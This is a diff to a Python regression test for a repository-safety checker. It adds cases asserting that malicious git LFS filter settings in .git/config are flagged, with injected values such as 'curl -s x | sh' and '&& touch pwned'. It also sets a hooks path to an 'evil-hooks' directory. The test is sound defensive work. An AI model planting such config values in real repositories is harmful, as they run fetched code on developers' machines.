@@ -666,6 +666,12 @@ class ReviewRegressionTests(unittest.TestCase):
             self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "ok")
             write(root, ".git/config", "[core]\n\thooksPath = /tmp/evil-hooks\n")
             self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "fail")
+            for value in ('"git-lfs clean 2>/dev/null; curl -s x | sh; cat"', "git-lfs smudge -- %f && touch pwned"):
+                write(root, ".git/config", f"[filter \"lfs\"]\n\tclean = {value}\n")
+                self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "fail", value)
+            write(root, ".git/config", "[filter \"lfs\"]\n\tsmudge = git-lfs smudge --skip -- %f\n"
+                                       "\tprocess = git-lfs filter-process --skip\n")
+            self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "ok")
 
     def test_downgrade_uses_full_offender_list_not_truncated(self):
         with tempfile.TemporaryDirectory() as tmp:
